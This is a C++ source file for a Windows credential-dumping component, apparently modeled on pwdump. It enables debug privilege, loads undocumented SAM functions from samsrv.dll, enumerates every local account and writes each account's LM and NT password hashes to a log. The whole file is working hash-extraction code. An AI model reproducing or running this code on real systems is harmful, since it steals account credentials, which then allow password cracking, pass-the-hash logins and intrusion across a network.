#include "sam_dump.h"


CSamDump::CSamDump()
{

}


CSamDump::~CSamDump()
{

}



BOOL CSamDump::get_all_apis(void)
{
	HINSTANCE hSamsrv = NULL;
	HINSTANCE hAdvapi32 = NULL;
		
	hAdvapi32	=	 LoadLibrary("advapi32.dll");
	hSamsrv		=	LoadLibrary("samsrv.dll");

	if (!hAdvapi32 || !hSamsrv)
	{
		flog("%s: unable to load libraries, error = %d\r\n", 
			__FUNCTION__,
			GetLastError());
		return FALSE;
	}

	pSamIGetPrivateData					= (SamIGetPrivateData_t)GetProcAddress(hSamsrv, "SamIGetPrivateData");
	pSystemFunction025					= (SystemFunction025_t)GetProcAddress(hAdvapi32, "SystemFunction025");
	pSystemFunction027					= (SystemFunction027_t)GetProcAddress(hAdvapi32, "SystemFunction027");
	pSamIConnect						= (SamIConnectFunc)GetProcAddress(hSamsrv, "SamIConnect");
	pSamrOpenDomain						= (SamrOpenDomainFunc)GetProcAddress(hSamsrv, "SamrOpenDomain");
	pSamrOpenUser						= (SamrOpenUserFunc)GetProcAddress(hSamsrv, "SamrOpenUser");
	pSamrQueryInformationUser			= (SamrQueryInformationUserFunc)GetProcAddress(hSamsrv, "SamrQueryInformationUser");
	pSamrEnumerateUsersInDomain			= (SamrEnumerateUsersInDomainFunc)GetProcAddress(hSamsrv, "SamrEnumerateUsersInDomain");
	pSamIFree_SAMPR_USER_INFO_BUFFER	= (SamIFree_SAMPR_USER_INFO_BUFFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
	pSamIFree_SAMPR_ENUMERATION_BUFFER	= (SamIFree_SAMPR_ENUMERATION_BUUFERFunc)GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
	pSamrCloseHandle					= (SamrCloseHandleFunc)GetProcAddress(hSamsrv, "SamrCloseHandle");

	if( !pSamIConnect || !pSamrOpenDomain || !pSamrOpenUser || !pSamrQueryInformationUser 
		|| !pSamrEnumerateUsersInDomain || !pSamIFree_SAMPR_USER_INFO_BUFFER 
		|| !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
	{
		flog("%s: unable to resolve api functions!\r\n",
			__FUNCTION__);
		return FALSE;
	}


	if( !pSamIGetPrivateData || !pSystemFunction025 || !pSystemFunction027 )
	{
		flog("%s: sam history will be not available!\r\n",
			__FUNCTION__);
	}



	return TRUE;
}




BOOL  CSamDump::samdump(void)
{
	this->Privs.ListPrivileges();

#define DEBUG_PRIV	"SeDebugPrivilege"
	if (!this->Privs.SetupPrivilege(DEBUG_PRIV, FALSE))
		return FALSE;


	// get all apis
	if (!this->get_all_apis())
		return FALSE;


	if (!this->sam_init())
	{
		this->sam_terminate();
		return FALSE;
	}


	flog("enumerating !\r\n");
	__try
	{
		this->sam_enumerate();
	} __except(EXCEPTION_EXECUTE_HANDLER)
	{
		flog("exception quiting!\r\n");
	}

	this->sam_terminate();
	this->Privs.SetupPrivilege(DEBUG_PRIV, TRUE);
	return TRUE;
}



BOOL	CSamDump::sam_init(void)
{




	memset(&attributes, 0, sizeof(LSA_OBJECT_ATTRIBUTES));
	attributes.Length	= sizeof(LSA_OBJECT_ATTRIBUTES);

	hLsa		=	NULL;
	pSysName	=	NULL;
	hUser		=	NULL;
	hDomain		=	NULL;
	hSam		=	NULL;

	// get policy handler
	rc = LsaOpenPolicy(pSysName, &attributes, POLICY_ALL_ACCESS, &hLsa);
	if(rc < 0)
	{
		//SendStatusMessage("Target: LsaOpenPolicy failed: 0x%08x", rc);
		
		get_error_msg((char*)&err_msg);
		flog("%s: LsaOpenPolicy returned 0x%08x (%s)\r\n",
			__FUNCTION__,
			rc,
			err_msg);
		return FALSE;
	}


	// get domain info
	rc = LsaQueryInformationPolicy(hLsa, PolicyAccountDomainInformation, (void**)&pDomainInfo);
	if(rc < 0)
	{
		get_error_msg((char*)&err_msg);
		flog("%s: LsaQueryInformationPolicy returned 0x%08x (%s)\r\n",
			__FUNCTION__,
			rc,
			err_msg);
		return FALSE;
	}


	// connect to the SAM database
	rc = pSamIConnect(0, &hSam, MAXIMUM_ALLOWED, 1);
	if(rc < 0)
	{
		get_error_msg((char*)&err_msg);
		flog("%s: SamIConnect returned 0x%08x (%s)\r\n",
			__FUNCTION__,
			rc,
			err_msg);
		return FALSE;
	}

	rc = pSamrOpenDomain(hSam, 0xf07ff, pDomainInfo->DomainSid, &hDomain);
	if( rc < 0 )
	{
		get_error_msg((char*)&err_msg);
		flog("%s: SamrOpenDomain returned 0x%08x (%s)\r\n",
			__FUNCTION__,
			rc,
			err_msg);
		return FALSE;
	}


	return TRUE;
}


BOOL	CSamDump::sam_terminate(void)
{



	if(hUser) 
		pSamrCloseHandle((HANDLE*)&hUser);
	if(hDomain) 
		pSamrCloseHandle((HANDLE*)&hDomain);
	if(hSam) 
		pSamrCloseHandle((HANDLE*)&hSam);
	if (hLsa)
		LsaClose(hLsa);


	return TRUE;
}


BOOL	CSamDump::sam_enumerate(void)
{




	dwEnum	=	0;
	pEnum	=	0;

	do
	{
		enumRc = pSamrEnumerateUsersInDomain(hDomain, &dwEnum, 0, &pEnum, 1000, &dwNumber);
		//flog("EnumRc = %d dwNumber=%d\r\n", enumRc, dwNumber);

		if(enumRc == 0 || enumRc == 0x105)
		{
			for(int i = 0; i < (int)dwNumber; i++)
			{
                

                //
                // parts based on pwdump
                //
                
                
				wchar_t		wszUserName[USER_BUFFER_LENGTH];
				wchar_t*	wszTemp = NULL;	
				BYTE		hashData[64];
				DWORD		dwSize;
				PVOID		pHashData = 0, pHistRec = 0;
				DWORD		dw1, dw2;
				DWORD		dwCounter, dwOffset;
				int			j;

				memset(wszUserName, 0, USER_BUFFER_LENGTH * sizeof(wszUserName[0]));
				memset(hashData, 0, sizeof(hashData));
				
				// Open the user (by Rid)
				rc = pSamrOpenUser(hDomain, MAXIMUM_ALLOWED, pEnum->users[i].rid, &hUser);
				if(rc < 0)
				{
					flog("%s: error SamrOpenUser (error=0x%08x), skipping.\r\n",
						__FUNCTION__, rc);
					continue;
				}

				rc = pSamrQueryInformationUser(hUser, SAM_USER_INFO_PASSWORD_OWFS, &pHashData);
				if (rc < 0)
				{
				
					flog("%s: error SamrQueryInformationUser (error=0x%08x), skipping.\r\n",
						__FUNCTION__, rc);
					pSamrCloseHandle((HANDLE*)&hUser);
					hUser = 0;
					continue;
				}

				wszTemp = (wchar_t*)malloc(pEnum->users[i].name.Length + 2);
				if (wszTemp)
				{
					memset(wszTemp, 0, pEnum->users[i].name.Length + 2);
					memcpy(wszTemp, pEnum->users[i].name.Buffer, pEnum->users[i].name.Length);

					_snwprintf(wszUserName, min(pEnum->users[i].name.Length + 10 / sizeof(WCHAR), sizeof(wszUserName) / sizeof(wszUserName[0])), L"%ls:%d", wszTemp, pEnum->users[i].rid);
					free(wszTemp);

					flog_w(wszUserName);
					this->sam_dump_hash(pHashData);

					
				}


				pSamrCloseHandle((HANDLE*)&hUser);
				hUser = 0;

			}
			
			pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnum);
			pEnum = NULL;
		}
	} while(enumRc == 0x105);



	flog("enumeration done!\r\n");
	return TRUE;
}




BOOL	CSamDump::sam_dump_hash(PVOID hash)
{
	PBYTE p = (PBYTE)hash;
    char szBuffer[1000];

	_snprintf (szBuffer, sizeof (szBuffer), 
				" HASH: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x:"
			   "%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x:::\r\n",
				p[16], p[17], p[18], p[19], p[20], p[21], p[22], p[23],
				p[24], p[25], p[26], p[27], p[28], p[29], p[30], p[31],
				p[0],  p[1],  p[2],  p[3],  p[4],  p[5],  p[6],  p[7],
				p[8],  p[9],  p[10], p[11], p[12], p[13], p[14], p[15]
				);


	flog(szBuffer);
	return TRUE;
}